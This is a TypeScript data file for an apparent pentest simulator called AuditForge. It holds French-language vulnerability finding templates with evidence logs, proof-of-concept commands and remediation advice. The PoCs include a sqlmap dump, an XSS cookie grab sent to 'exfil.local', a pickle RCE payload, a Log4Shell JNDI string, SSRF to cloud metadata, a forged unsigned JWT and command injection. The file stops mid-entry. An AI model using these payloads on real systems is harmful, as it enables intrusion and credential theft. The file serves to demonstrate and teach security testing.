/**
 * AuditForge — Données de simulation du moteur.
 *
 * - TOOL_FACTORS / PHASES / PROFILE_SECONDS / FINDING_COUNTS : paramètres
 *   des pipelines de simulation (cf. worklog section I — contrats verrouillés).
 * - FINDING_POOLS : templates de constats par outil (textes français réalistes).
 * - SCRIPT_BUILDERS : génération des lignes de logs simulées, réparties sur
 *   les phases de l'outil, triées par atMs strictement croissant.
 *
 * Remarques :
 * - Les payloads contenant des séquences type `${jndi:...}` sont échappés
 *   dans les chaînes template afin de rester du texte brut.
 * - Le dernier script retourné s'arrête vers ~97 % de totalMs : la ligne
 *   finale de synthèse est ajoutée par le moteur lui-même.
 */

import type { Confidence, LogLevel, Profile, Severity, TargetType, Tool } from "./types";

// ─── Paramètres de simulation ─────────────────────────────────────────

export const TOOL_FACTORS: Record<Tool, number> = {
  PHANTOM: 1.0,
  DEEPAUDIT: 1.15,
  BASALT: 0.9,
  REDAMON: 1.05,
};

export const PHASES: Record<Tool, { name: string; frac: number }[]> = {
  PHANTOM: [
    { name: "INIT", frac: 0.06 },
    { name: "RECON", frac: 0.18 },
    { name: "ENUMERATION", frac: 0.24 },
    { name: "EXPLOITATION", frac: 0.3 },
    { name: "POST-EXPLOITATION", frac: 0.14 },
    { name: "RAPPORT", frac: 0.08 },
  ],
  DEEPAUDIT: [
    { name: "INIT", frac: 0.06 },
    { name: "AGENT RECON", frac: 0.18 },
    { name: "AGENT ANALYSE", frac: 0.3 },
    { name: "AGENT VÉRIFICATION (sandbox PoC)", frac: 0.3 },
    { name: "RAPPORT", frac: 0.16 },
  ],
  BASALT: [
    { name: "INIT", frac: 0.05 },
    { name: "CHARGEMENT RÈGLES", frac: 0.12 },
    { name: "BUILD SANDBOX (réseau coupé)", frac: 0.18 },
    { name: "EXÉCUTION POC", frac: 0.45 },
    { name: "RAPPORT", frac: 0.2 },
  ],
  REDAMON: [
    { name: "INIT", frac: 0.06 },
    { name: "ENUM SOUS-DOMAINES", frac: 0.22 },
    { name: "SCAN PORTS", frac: 0.24 },
    { name: "FINGERPRINT", frac: 0.2 },
    { name: "EXPLOITATION", frac: 0.2 },
    { name: "RAPPORT", frac: 0.08 },
  ],
};

export const PROFILE_SECONDS: Record<Profile, number> = {
  QUICK: 22,
  STANDARD: 40,
  DEEP: 70,
};

export const FINDING_COUNTS: Record<Profile, number> = {
  QUICK: 3,
  STANDARD: 5,
  DEEP: 8,
};

/**
 * Nombre de constats réellement produits pour un couple outil ⇄ profil :
 * min(FINDING_COUNTS[profile], taille du pool de l'outil).
 * Les scripts qui ANNONCENT le nombre de constats doivent utiliser ce helper
 * (contrat N.26) — sinon un DEEP sur BASALT (pool de 6) annoncerait 8 constats
 * alors que le moteur n'en produit que 6.
 */
export function effectiveFindingCount(tool: Tool, profile: Profile): number {
  return Math.min(FINDING_COUNTS[profile], FINDING_POOLS[tool].length);
}

// ─── Templates de constats ────────────────────────────────────────────

export interface FindingTemplate {
  key: string;
  title: string;
  severity: Severity;
  confidence: Confidence;
  category: string;
  cve?: string;
  cvss: number;
  location: string;
  description: string;
  evidence: string;
  poc: string;
  remediation: string;
  /** BASALT uniquement : la sentinelle a été déclenchée par le PoC. */
  sentinel: boolean;
}

export const FINDING_POOLS: Record<Tool, FindingTemplate[]> = {
  // ── PHANTOM — agent IA pentest autonome (boucle ReAct) ──
  PHANTOM: [
    {
      key: "p1",
      title: "Injection SQL dans le endpoint d'authentification",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "injection",
      cvss: 9.8,
      location: "POST /login — paramètre `email`",
      description:
        "Le paramètre email du formulaire de connexion est concaténé directement dans une requête SQL. " +
        "L'agent PHANTOM a exploité une injection time-based blind SQLi puis exfiltré l'intégralité de la table " +
        "des utilisateurs (identifiants, hachages de mots de passe, jetons de session), compromettant l'ensemble " +
        "des comptes de la plateforme.",
      evidence:
        "[13:41:55] [httpx] https://<TARGET> [200] — formulaire de login détecté\n" +
        "[13:42:07] [INFO] testing for SQL injection on POST parameter 'email'\n" +
        "[13:42:19] [WARNING] POST parameter 'email' is vulnerable. Do you want to exploit? [Y/x]\n" +
        "[13:42:24] [INFO] time-based blind SQLi confirmée (payload: admin@x.io' AND 2178=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--)\n" +
        "[13:42:58] [INFO] back-end DBMS: SQLite\n" +
        "[13:43:12] [INFO] dumping table 'users' (14 rows)\n" +
        "[13:43:31] [INFO] sqlmap resumed: retrieved 14 password hashes",
      poc:
        'sqlmap -u "https://<TARGET>/login" \\\n' +
        '  --data="email=admin@x.io&password=x" \\\n' +
        "  -p email --batch --threads=5 --dump -T users",
      remediation:
        "Requêtes préparées ou ORM avec paramètres liés ; validation stricte des entrées (type, format, longueur) ; " +
        "WAF en complément seulement — jamais en défense unique ; journalisation et alerte sur les tentatives d'injection.",
      sentinel: false,
    },
    {
      key: "p2",
      title: "XSS réfléchi dans la page de recherche",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "xss",
      cvss: 6.1,
      location: "GET /search?q=",
      description:
        "Le paramètre q de la page de résultats est réfléchi dans le HTML sans encodage contextuel. Une URL piégée " +
        "permet d'exécuter du JavaScript arbitraire dans le navigateur d'une victime authentifiée (vol de cookie " +
        "de session, actions effectuées au nom de l'utilisateur).",
      evidence:
        "[ffuf] /search?q=test [200] — paramètre réfléchi sans encodage HTML\n" +
        "[nuclei] [reflected-xss] [http] [medium] https://<TARGET>/search?q=<script>alert(1)</script>\n" +
        "[verify] payload renvoyé tel quel dans la réponse, ligne 42 : <div class=\"query\"><script>alert(1)</script></div>\n" +
        "[headers] aucune politique Content-Security-Policy détectée",
      poc:
        "curl -s \"https://<TARGET>/search?q=<script>fetch('https://exfil.local/'+document.cookie)</script>\"",
      remediation:
        "Échappement contextuel côté rendu (HTML, attribut, JS) ; politique CSP stricte (nonce ou hash) ; " +
        "validation du paramètre q côté serveur ; cookies HttpOnly/Secure/SameSite.",
      sentinel: false,
    },
    {
      key: "p3",
      title: "Répertoire .git exposé publiquement",
      severity: "HIGH",
      confidence: "PROBABLE",
      category: "recon",
      cvss: 7.5,
      location: "GET /.git/HEAD",
      description:
        "Le répertoire .git du déploiement est accessible publiquement. La reconstruction du dépôt source expose " +
        "le code métier, les dépendances, des secrets d'environnement historisés et la logique d'authentification " +
        "complète à quiconque connaît l'outil de dump.",
      evidence:
        "GET /.git/HEAD → 200 (ref: refs/heads/main)\n" +
        "GET /.git/config → 200 (remote origin détecté)\n" +
        "git-dumper: 218 objets récupérés (branche main, 87 commits)\n" +
        "dump/.env historisé → DB_PASSWORD et SMTP_TOKEN présents au commit a41f2c9",
      poc:
        "git-dumper https://<TARGET>/.git ./dump \\\n" +
        "  && git -C ./dump log --oneline | head \\\n" +
        "  && grep -rE \"PASSWORD|TOKEN|SECRET\" ./dump --include=\".env*\"",
      remediation:
        "Bloquer l'accès à /.git en configuration serveur (deny) ; ne déployer que les artefacts de build ; " +
        "révoquer tous les secrets historisés dans le dépôt ; réécrire l'historique git si nécessaire.",
      sentinel: false,
    },
    {
      key: "p4",
      title: "IDOR sur la liste des factures",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "authz",
      cvss: 8.1,
      location: "GET /api/invoices/{id}",
      description:
        "L'API de facturation ne vérifie pas l'appartenance de l'objet au tenant de l'appelant. En itérant " +
        "l'identifiant séquentiel, l'agent a lu les factures d'autres clients (PII : noms, adresses, montants), " +
        "violation directe du contrôle d'accès par objet.",
      evidence:
        "GET /api/invoices/1042 → 200 (facture du tenant courant)\n" +
        "GET /api/invoices/1043 → 200 {\"id\":1043,\"customer_name\":\"ACME Corp\",\"total\":\"12 480,00 €\",\"email\":\"compta@acme.example\"}\n" +
        "→ 17/19 identifiants testés retournent des factures d'autres tenants (HTTP 200)\n" +
        "aucune entrée de contrôle d'autorisation côté serveur",
      poc:
        "for i in $(seq 1040 1060); do\n" +
        "  curl -s -H \"Authorization: Bearer $TOKEN\" \\\n" +
        "    https://<TARGET>/api/invoices/$i | jq -r '.id,.customer_name'\n" +
        "done",
      remediation:
        "Contrôle d'autorisation par objet côté serveur (tenant_id lié à la session) ; remplacer les identifiants " +
        "séquentiels par des UUID ; tests d'accès croisés en CI ; alerte sur les énumérations d'identifiants.",
      sentinel: false,
    },
    {
      key: "p5",
      title: "Injection de commande via l'en-tête User-Agent",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "injection",
      cvss: 9.1,
      location: "POST /admin/export",
      description:
        "La fonctionnalité d'export CSV transmet l'en-tête User-Agent à un appel shell d'instrumentation. " +
        "L'agent a injecté une charge `;id;#` et récupéré la sortie de la commande directement dans le fichier " +
        "exporté — exécution de code à distance en tant que root sur le conteneur applicatif.",
      evidence:
        "POST /admin/export (User-Agent normal) → 200, export.csv généré en 1,1 s\n" +
        "POST /admin/export (User-Agent: `;sleep 3;#) → 200, réponse retardée de 3,0 s (canal temps confirmé)\n" +
        "POST /admin/export (User-Agent: `;id;#) → colonne generated_by du CSV : uid=33(root) gid=33(root) groups=33(root)\n" +
        "→ le conteneur applicatif tourne en root, pas de cloisonnement",
      poc:
        "curl -s https://<TARGET>/admin/export \\\n" +
        "  -H \"User-Agent: `;id;#\" \\\n" +
        "  -o out.csv && head -2 out.csv",
      remediation:
        "Ne jamais invoquer un shell pour construire l'export ; utiliser des APIs de process sans sh -c " +
        "(execFile avec tableau d'arguments) ; liste blanche stricte des en-têtes propagés ; exécuter le service " +
        "avec un compte non privilégié.",
      sentinel: false,
    },
    {
      key: "p6",
      title: "SSRF sur le service de prévisualisation d'URL",
      severity: "HIGH",
      confidence: "PROBABLE",
      category: "ssrf",
      cvss: 7.4,
      location: "POST /api/fetch {url}",
      description:
        "Le service de prévisualisation télécharge l'URL fournie sans aucune validation. L'agent a interrogé le " +
        "service de métadonnées AWS depuis le serveur et récupéré l'identifiant d'AMI ainsi que le rôle IAM attaché — " +
        "pivot possible vers le compte cloud.",
      evidence:
        "POST /api/fetch {\"url\":\"https://example.com\"} → 200 (preview rendue)\n" +
        "POST /api/fetch {\"url\":\"http://169.254.169.254/latest/meta-data/\"} → 200\n" +
        "réponse rendue dans la preview : ami-0abc123def456789 / iam/security-credentials/app-role\n" +
        "aucune liste d'interdiction d'IP internes, redirections suivies",
      poc:
        "curl -s -X POST https://<TARGET>/api/fetch \\\n" +
        "  -H 'Content-Type: application/json' \\\n" +
        "  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
      remediation:
        "Liste d'autorisation de domaines pour les URLs téléchargées ; blocage des IP privées/link-local " +
        "(avec gestion des redirections) ; réseau egress restreint pour le service ; IMDSv2 obligatoire (hop limit).",
      sentinel: false,
    },
    {
      key: "p7",
      title: "Identifiants par défaut sur la console d'administration",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "auth",
      cvss: 9.4,
      location: "POST /admin/login (admin:admin)",
      description:
        "La console d'administration accepte toujours le couple d'identifiants par défaut admin:admin. L'agent a " +
        "ouvert une session administrateur complète : gestion des utilisateurs, configuration applicative et " +
        "données de tous les tenants accessibles sans MFA ni alerte de connexion.",
      evidence:
        "POST /admin/login (admin:admin) → 302 /admin/dashboard\n" +
        "Set-Cookie: admin_session=… (session privilégiée créée)\n" +
        "GET /admin/users → 24 comptes listés (dont 3 administrateurs)\n" +
        "aucun MFA, aucune notification de connexion",
      poc:
        "curl -si -X POST https://<TARGET>/admin/login \\\n" +
        "  -d 'username=admin&password=admin' | head -1",
      remediation:
        "Changement de mot de passe forcé à l'installation ; verrouillage du compte après N échecs ; MFA " +
        "obligatoire pour les comptes d'administration ; suppression des comptes par défaut documentés.",
      sentinel: false,
    },
    {
      key: "p8",
      title: "Suites de chiffrement TLS obsolètes (TLS 1.0 activé)",
      severity: "LOW",
      confidence: "PROBABLE",
      category: "crypto",
      cvss: 3.7,
      location: "443/tcp (nginx 1.18)",
      description:
        "Le serveur accepte encore TLS 1.0 et des suites CBC obsolètes, exposant les connexions à des attaques de " +
        "dégradation (BEAST, POODLE) et à un décryptage passif par des capteurs intermédiaires.",
      evidence:
        "nmap ssl-enum-ciphers 443/tcp :\n" +
        "| TLSv1.0 :\n" +
        "|   TLS_RSA_WITH_AES_128_CBC_SHA (0x002f) — WEAK\n" +
        "|   TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a) — INSECURE\n" +
        "| TLSv1.2 : 12 suites (OK)\n" +
        "certificat Let's Encrypt, expire dans 41 jours",
      poc:
        "nmap --script ssl-enum-ciphers -p 443 <TARGET>",
      remediation:
        "TLS 1.2 minimum (1.3 recommandé) ; suites AEAD modernes (ECDHE + AES-GCM/ChaCha20) ; en-tête HSTS avec " +
        "preload ; rechargement de la configuration nginx après durcissement.",
      sentinel: false,
    },
  ],

  // ── DEEPAUDIT — audit de code multi-agents (Recon, Analyse, Vérification) ──
  DEEPAUDIT: [
    {
      key: "d1",
      title: "Secret AWS codé en dur dans la configuration",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "secrets",
      cvss: 9.3,
      location: "backend/config/settings.py:42",
      description:
        "Une paire de clés AWS est codée en dur dans la configuration versionnée. L'agent de vérification a " +
        "confirmé que la clé est active depuis 68 jours et dispose de permissions S3 étendues : lecture/écriture " +
        "des buckets applicatifs possible depuis le dépôt ou l'historique git.",
      evidence:
        "[semgrep] backend/config/settings.py:42 — generic.hardcoded-aws-key\n" +
        "  aws_access_key_id = \"AKIA…4XFQ\"\n" +
        "[git log] clé introduite au commit 7d2e1b0 (il y a 68 jours, jamais expirée)\n" +
        "[vérification] aws sts get-caller-identity → Account 4219…, User deploy-bot (clé ACTIVE)\n" +
        "[iam] politique attachée : s3:* sur bucket auditforge-prod-data",
      poc:
        "grep -rn \"AKIA\" backend/config/\n" +
        "aws sts get-caller-identity --profile leaked\n" +
        "aws s3 ls --profile leaked",
      remediation:
        "Révoquer immédiatement la clé exposée et pivoter les secrets ; passer par un gestionnaire de secrets " +
        "(Vault, SSM, Secrets Manager) ; git-secrets ou gitleaks en CI pour bloquer les commits ; politique IAM " +
        "au minimum requis.",
      sentinel: false,
    },
    {
      key: "d2",
      title: "Désérialisation non sécurisée de données utilisateur (pickle)",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "deserialization",
      cvss: 9.8,
      location: "backend/api/cache.py:118",
      description:
        "Le jeton de session restauré est décodé en base64 puis désérialisé avec pickle.loads. Un attaquant peut " +
        "forger un payload pickle exécutant du code Python arbitraire sur le serveur au moment de la restauration " +
        "de session — RCE pré-authentification.",
      evidence:
        "backend/api/cache.py:118\n" +
        "  data = pickle.loads(base64.b64decode(user_token))\n" +
        "atteignable depuis POST /api/session/restore (cookie session_data)\n" +
        "[agent:vérification] PoC exécuté en sandbox réseau coupé : écriture de /tmp/pwned confirmée (RCE)",
      poc:
        "import pickle, base64, os\n" +
        "\n" +
        "class P:\n" +
        "    def __reduce__(self):\n" +
        "        return (os.system, (\"id > /tmp/pwned\",))\n" +
        "\n" +
        "print(base64.b64encode(pickle.dumps(P())).decode())\n" +
        "# puis : curl -b \"session_data=<payload>\" https://<TARGET>/api/session/restore",
      remediation:
        "Remplacer pickle par un format sûr (JSON) pour toute donnée externe ; jamais d'unpickle de données " +
        "utilisateur ; si inévitable : signature HMAC + chiffrement authentifié + restriction des classes autorisées.",
      sentinel: false,
    },
    {
      key: "d3",
      title: "Path traversal dans le téléchargement de rapports",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "path-traversal",
      cvss: 7.8,
      location: "backend/routes/files.py:57",
      description:
        "Le paramètre name du téléchargement de rapport est concaténé au répertoire de stockage sans normalisation. " +
        "L'agent a lu /etc/passwd puis le fichier de configuration applicative contenant l'URL de base de données.",
      evidence:
        "GET /files/report?name=rapport-2024.pdf → 200 (usage normal)\n" +
        "GET /files/report?name=../../../../etc/passwd → 200\n" +
        "  root:x:0:0:root:/root:/bin/bash\n" +
        "  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n" +
        "GET /files/report?name=../../app/.env → 200 (DATABASE_URL exposé)",
      poc:
        "curl -s \"https://<TARGET>/files/report?name=../../../../etc/passwd\" | head -3",
      remediation:
        "basename() + liste d'autorisation d'extensions/noms ; résolution canonique (Path.resolve) avec vérification " +
        "du préfixe du répertoire autorisé ; utilisateur dédié en lecture seule ou chroot.",
      sentinel: false,
    },
    {
      key: "d4",
      title: "Dépendance critique vulnérable — Log4Shell",
      severity: "CRITICAL",
      confidence: "PROBABLE",
      category: "dependency",
      cve: "CVE-2021-44228",
      cvss: 10.0,
      location: "services/api/pom.xml (log4j-core 2.14.1)",
      description:
        "Le service API embarque log4j-core 2.14.1, vulnérable à Log4Shell (RCE pré-authentification). Le lookup " +
        "JNDI est atteignable via l'en-tête X-Api-Version propagé aux logs. Le callback LDAP externe n'a pas été " +
        "observé (sandbox sans réseau) : la criticité reste PROBABLE jusqu'à confirmation par canary.",
      evidence:
        "[pom.xml] <artifactId>log4j-core</artifactId> <version>2.14.1</version>\n" +
        "[agent:analyse] lookup JNDI atteignable : header X-Api-Version → logger.info()\n" +
        "[agent:vérification] payload ${jndi:ldap://canary.local/a} injecté → aucune résolution DNS (sandbox sans réseau)\n" +
        "[historique] CVE-2021-44228 : RCE pré-authentification, CVSS 10.0",
      poc:
        "curl -s https://<TARGET>/api/health \\\n" +
        "  -H 'X-Api-Version: ${jndi:ldap://canary.local/a}'\n" +
        "# puis vérifier le callback sur le serveur canary.local",
      remediation:
        "Upgrade log4j-core >= 2.17.1 ; retirer les lookups JNDI (formatMsgNoLookups en transition) ; SBOM + scan " +
        "de dépendances en CI (OWASP dependency-check) ; canary DNS pour détecter les tentatives d'exploitation.",
      sentinel: false,
    },
    {
      key: "d5",
      title: "Tokens JWT signés avec alg=none acceptés",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "auth",
      cvss: 8.6,
      location: "backend/auth/jwt.py:31",
      description:
        "La bibliothèque JWT est appelée sans épingler l'algorithme et avec verify_signature=False sur un chemin " +
        "de code. Un token forgé avec alg: none et rôle ADMIN est accepté : usurpation d'identité complète sans " +
        "connaître la clé de signature.",
      evidence:
        "backend/auth/jwt.py:31\n" +
        "  jwt.decode(token, algorithms=[\"HS256\",\"none\"], verify_signature=False)\n" +
        "[vérification] token forgé alg=none {\"sub\":\"admin\",\"role\":\"ADMIN\"}\n" +
        "  GET /api/me → 200 (401 attendu) — rôle ADMIN accepté\n" +
        "durée de vie du token : 24 h, pas de mécanisme de révocation",
      poc:
        "python3 -c \"import jwt;print(jwt.encode({'sub':'admin','role':'ADMIN'}, key='', algorithm='none'))\"\n" +
        "# puis :\n" +
        "curl -s -H \"Authorization: Bearer <token>\" https://<TARGET>/api/me",
      remediation:
        "Épingler l'algorithme attendu (HS256 ou RS256 unique) ; toujours vérifier la signature ; rejeter alg: none " +
        "et les confusions de type de clé ; durée de vie courte + révocation côté serveur.",
      sentinel: false,
    },
    {
      key: "d6",
      title: "Pollution de prototype via deepMerge",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "prototype-pollution",
      cvss: 6.3,
      location: "frontend/src/utils/deepMerge.js:12",
      description:
        "La fonction de fusion récursive utilisée pour les configurations utilisateur ne filtre pas les clés " +
        "__proto__ et constructor. La pollution de Object.prototype peut contourner des contrôles d'accès côté " +
        "client et, selon le rendu serveur, mener à du XSS ou à un RCE dans les librairies vulnérables.",
      evidence:
        "frontend/src/utils/deepMerge.js:12\n" +
        "  for (const key in src) target[key] = merge(target[key], src[key])\n" +
        "clé __proto__ non filtrée, appelée sur du JSON utilisateur (préférences, thème)\n" +
        "[agent:vérification] PoC node : ({}).isAdmin === true après fusion → confirmé en sandbox",
      poc:
        "deepMerge({}, JSON.parse('{\"__proto__\":{\"isAdmin\":true}}'));\n" +
        "console.log(({}).isAdmin); // true — prototype pollué",
      remediation:
        "Utiliser Map ou Object.create(null) pour les objets de configuration ; filtrer les clés __proto__ / " +
        "constructor / prototype ; fonction de fusion auditée (lodash >= 4.17.21) ; test de régression anti-pollution.",
      sentinel: false,
    },
    {
      key: "d7",
      title: "Absence de limitation de débit sur les endpoints d'authentification",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "auth",
      cvss: 5.3,
      location: "backend/routes/auth.py",
      description:
        "Aucun rate limiting n'est appliqué sur la connexion : 421 requêtes acceptées en 30 secondes depuis une " +
        "même IP. Le credential stuffing et le brute force de mots de passe sont réalisables à grande échille " +
        "sans détection ni blocage.",
      evidence:
        "500 requêtes POST /login envoyées en 30 s\n" +
        "421 réponses 401 (traitées complètement), 0 blocage, 0 CAPTCHA\n" +
        "aucun délai progressif, aucune alerte SI\n" +
        "tentatives depuis une seule IP source sans ban",
      poc:
        "for i in $(seq 1 500); do\n" +
        "  curl -s -o /dev/null -w \"%{http_code} \" \\\n" +
        "    -d \"user=a&pass=b\" https://<TARGET>/login\n" +
        "done | sort | uniq -c",
      remediation:
        "Rate limiting par IP + par compte (ex. 5 échecs / 15 min) ; backoff exponentiel et verrouillage " +
        "temporaire ; CAPTCHA progressif ; journalisation et alerte sur les anomalies d'authentification.",
      sentinel: false,
    },
    {
      key: "d8",
      title: "Divulgation d'informations via les traces d'erreurs",
      severity: "LOW",
      confidence: "PROBABLE",
      category: "info-disclosure",
      cvss: 3.1,
      location: "GET /api/500-test",
      description:
        "Les exceptions non gérées renvoient la stack trace Python complète en production : chemins internes, " +
        "versions de bibliothèques et extraits de code source. Ces informations facilitent la préparation " +
        "d'attaques ciblées contre l'infrastructure.",
      evidence:
        "GET /api/500-test → 500\n" +
        "réponse :\n" +
        "Traceback (most recent call last):\n" +
        "  File \"/srv/app/backend/api/views.py\", line 88, in test_endpoint\n" +
        "    raise ValueError(\"debug\")\n" +
        "Python 3.11.4 et Flask 2.3.2 exposés — DEBUG=True actif en production",
      poc:
        "curl -s https://<TARGET>/api/500-test | grep -E 'File \"|Traceback'",
      remediation:
        "Pages d'erreur génériques (code de corrélation renvoyé au client) ; logs complets côté serveur " +
        "uniquement ; DEBUG=False en production ; middleware d'exception global.",
      sentinel: false,
    },
  ],

  // ── BASALT — vérification par exécution de PoC en sandbox sans réseau ──
  // b1..b5 : sentinel=true / CONFIRMED ; b6 : volontairement non déclenché (UNVERIFIED).
  BASALT: [
    {
      key: "b1",
      title: "Injection SQL confirmée par exécution de PoC",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "injection",
      cvss: 9.8,
      location: "app/db/users.dao:88",
      description:
        "Le PoC compilé en sandbox a exécuté une injection SQL complète contre le DAO utilisateur : la requête " +
        "mal paramétrée a détruit la table sentinelle, preuve d'exécution directe du vecteur d'injection par " +
        "l'application elle-même.",
      evidence:
        "[b1] compilation du PoC en sandbox : OK (sqlite3 embarqué)\n" +
        "[b1] exécution : requête générée depuis app/db/users.dao:88\n" +
        "[BASALT-POC-TRIGGERED] sentinelle détectée : table sentinel supprimée (DROP TABLE)\n" +
        "dump capturé : 3 lignes de /tmp/sentinel retournées par le PoC\n" +
        "réseau : coupé — aucune fuite externe pendant l'exécution",
      poc:
        "import sqlite3\n" +
        "db = sqlite3.connect(\"/work/app.db\")\n" +
        "# payload injecté via le paramètre id\n" +
        "db.execute(\"SELECT * FROM users WHERE id = '1'; DROP TABLE IF EXISTS sentinel; --\")\n" +
        "print(db.execute(\"SELECT * FROM sentinel\").fetchall())",
      remediation:
        "Requêtes paramétrées dans le DAO ; interdiction de la concaténation SQL ; comptes de base de données " +
        "à privilèges minimaux (pas de DDL en production) ; revue de code systématique des couches d'accès aux données.",
      sentinel: true,
    },
    {
      key: "b2",
      title: "Chaîne de gadgets de désérialisation déclenchée",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "deserialization",
      cvss: 9.0,
      location: "app/utils/serialize.rb:24",
      description:
        "Le PoC Ruby a désérialisé un objet Marshal contrôlé, déclenchant la chaîne de gadgets embarquée : " +
        "écriture du fichier sentinelle dans le bac à sable, preuve d'exécution de code arbitraire via Marshal.load.",
      evidence:
        "[b2] PoC ruby : Marshal.load(Base64.decode64(payload))\n" +
        "[BASALT-POC-TRIGGERED] sentinelle détectée : /tmp/sentinel/pwned.txt écrit par le gadget\n" +
        "chaîne : deserialize → objet embarqué → Kernel#eval (gadget natif)\n" +
        "exit code 0 — charge utile exécutée intégralement",
      poc:
        "require 'base64'; require 'marshal'\n" +
        "payload = Base64.decode64(ARGV[0])\n" +
        "# gadget : classe embarquée dont la méthode _load exécute un eval\n" +
        "Marshal.load(payload)",
      remediation:
        "Ne jamais désérialiser des données utilisateur avec Marshal ; préférer JSON ; signer les blobs " +
        "sérialisés si inévitable ; geler les classes chargées et isoler le processus de désérialisation.",
      sentinel: true,
    },
    {
      key: "b3",
      title: "Path traversal confirmé (lecture /etc/passwd en sandbox)",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "path-traversal",
      cvss: 7.8,
      location: "handlers/download.go:41",
      description:
        "Le handler Go de téléchargement a suivi un chemin ../../../../../etc/passwd et renvoyé le contenu du " +
        "fichier système capturé par le PoC dans la sandbox : la normalisation de chemin est absente côté serveur.",
      evidence:
        "[b3] requête PoC : GET /download?name=../../../../../etc/passwd\n" +
        "[BASALT-POC-TRIGGERED] sentinelle détectée : contenu /etc/passwd capturé (6 lignes)\n" +
        "  root:x:0:0:root:/root:/bin/sh\n" +
        "  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n" +
        "http.ServeFile appelé avec le chemin non nettoyé (handlers/download.go:41)",
      poc:
        "// handlers/download.go\n" +
        "name := r.URL.Query().Get(\"name\")\n" +
        "// traversal non filtré : name peut contenir ../../../../../etc/passwd\n" +
        "http.ServeFile(w, r, filepath.Join(\"/data/reports\", name))",
      remediation:
        "filepath.Clean + vérification du préfixe du répertoire racine ; refus des segments .. ; stockage avec " +
        "identifiants indirects (id → chemin serveur) ; tests unitaires anti-traversal.",
      sentinel: true,
    },
    {
      key: "b4",
      title: "Pollution de prototype confirmée",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "prototype-pollution",
      cvss: 7.1,
      location: "src/merge.ts:19",
      description:
        "Le PoC Node a pollué Object.prototype via la fonction merge : la propriété sentinelle isAdmin est apparue " +
        "sur un objet vierge, confirmant l'absence de filtrage des clés dangereuses dans la fusion.",
      evidence:
        "[b4] PoC : merge({}, JSON.parse('{\"__proto__\":{\"isAdmin\":true}}'))\n" +
        "[BASALT-POC-TRIGGERED] sentinelle détectée : ({}).isAdmin === true après fusion\n" +
        "src/merge.ts:19 — assignation directe target[key] = value\n" +
        "impact applicatif : contournement de garde-fous côté client (feature flags)",
      poc:
        "merge({}, JSON.parse('{\"__proto__\":{\"isAdmin\":true}}'));\n" +
        "console.log(({}).isAdmin); // true — sentinelle déclenchée",
      remediation:
        "Filtrer __proto__ / constructor / prototype dans toute fusion ; Object.create(null) pour les cibles ; " +
        "utiliser une librairie maintenue (lodash >= 4.17.21) ; test de régression dédié.",
      sentinel: true,
    },
    {
      key: "b5",
      title: "ReDoS confirmé — blocage event-loop 12 s",
      severity: "MEDIUM",
      confidence: "CONFIRMED",
      category: "dos",
      cvss: 5.9,
      location: "src/validators/email.ts:33",
      description:
        "La regex de validation d'email à quantificateurs imbriqués bloque l'event-loop 12 secondes sur une chaîne " +
        "adversariale : une seule requête suffit à geler le processus Node, menant à un déni de service complet.",
      evidence:
        "[b5] PoC : regex /(a+)+$/ testée sur 'a'.repeat(30) + '!'\n" +
        "[BASALT-POC-TRIGGERED] sentinelle horloge : event-loop bloquée 12,0 s (> seuil 2 s)\n" +
        "CPU : 100 % d'un cœur pendant toute l'exécution\n" +
        "src/validators/email.ts:33 — validation synchrone dans le handler",
      poc:
        "const re = /(a+)+$/;\n" +
        "const input = 'a'.repeat(30) + '!';\n" +
        "console.time('redos');\n" +
        "re.test(input); // ~12 s de blocage\n" +
        "console.timeEnd('redos');",
      remediation:
        "Remplacer la regex à récursion catastrophique (validation RFC 5322 simplifiée ou librairie éprouvée) ; " +
        "moteur de regex linéaire (RE2) ; validation asynchrone hors event-loop critique ; rate limiting des " +
        "endpoints de validation.",
      sentinel: true,
    },
    {
      key: "b6",
      title: "SSRF non vérifiable — sandbox sans réseau",
      severity: "HIGH",
      confidence: "UNVERIFIED",
      category: "ssrf",
      cvss: 7.4,
      location: "api/fetcher.js:27",
      description:
        "Le PoC SSRF a été exécuté en sandbox sans accès réseau : le callback d'exfiltration n'a jamais été reçu, " +
        "la vérification par exécution est donc impossible. L'analyse statique du fetcher reste très suspecte " +
        "(URL utilisateur passée à http.get sans validation) — vérification manuelle requise.",
      evidence:
        "[b6] PoC : http.get('http://canary.basalt.local/<token>')\n" +
        "PoC exécuté en sandbox SANS accès réseau : le callback exfil n'a jamais été reçu\n" +
        "sentinelle réseau : non déclenchée (par conception)\n" +
        "api/fetcher.js:27 — validation d'URL absente (allowlist manquante)\n" +
        "conclusion : CONFIRMATION MANUELLE REQUISE (risque élevé conservé)",
      poc:
        "// api/fetcher.js\n" +
        "const url = req.body.url; // non validé\n" +
        "http.get(url, (res) => res.pipe(preview)); // SSRF probable",
      remediation:
        "Vérification manuelle avec un canary DNS/HTTP externe ; allowlist stricte des domaines cibles ; blocage " +
        "des IP privées/link-local ; réseau egress restreint pour le service de prévisualisation.",
      sentinel: false,
    },
  ],

  // ── REDAMON — reconnaissance & exploitation ──
  REDAMON: [
    {
      key: "r1",
      title: "Redis exposé sans authentification (6379/tcp)",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      category: "misconfig",
      cvss: 9.1,
      location: "redis 6379/tcp (redis 5.0.7)",
      description:
        "Redis est exposé publiquement sans mot de passe. L'agent a listé les clés (14 entrées dont des sessions " +
